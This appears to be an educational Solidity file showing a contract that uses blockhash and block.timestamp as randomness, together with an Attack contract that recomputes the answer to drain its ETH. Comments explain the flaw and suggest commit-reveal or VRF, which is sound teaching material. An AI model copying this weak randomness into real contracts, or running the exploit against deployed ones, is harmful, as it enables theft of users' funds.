// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

/*
 * Insecure sources of randomness:
 * - Vulnerability (source randomness)
 *   - block.timestamp
 *   - blockhash
 */
contract GuessRandomNumber {
  // at deployment time, some ETH are deposited in the contract
  constructor() payable {}

  // calling this function with the correct number credits caller with all the
  // ETH stored in the contract.
  function guess(uint number) public {
    /*
     * Attack Vector
     * - A miner or any user with the ability to precisely predict when their
     *   transaction will be included can:
     *   1. Calculate the exact same "random" answer by using the previous
     *      block hash and predicting the timestamp
     *   2. Call the `guess()` function with the correct number
     *   3. Drain all ETH from the contract
     * In a nutshell, never use onchain randomness source.
     * Prefer :
     * - a commit-reveal scheme (cope with a bit of centralization)
     * - using chainlink VRF (Verifiable Random Function)
     * - using a trusted external Oracle service for random generation (cope
     *   with a bit of centralization)
     */
    uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

    if (number == answer) {
      payable(msg.sender).transfer(address(this).balance);
    }
  }
}

contract Attack {
  receive() external payable {}

  function attack(GuessRandomNumber grn) public {
    // simple attack that consist in replicating the logic
    // But, this attack is also suceptible to front-running
    uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

    grn.guess(answer);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}
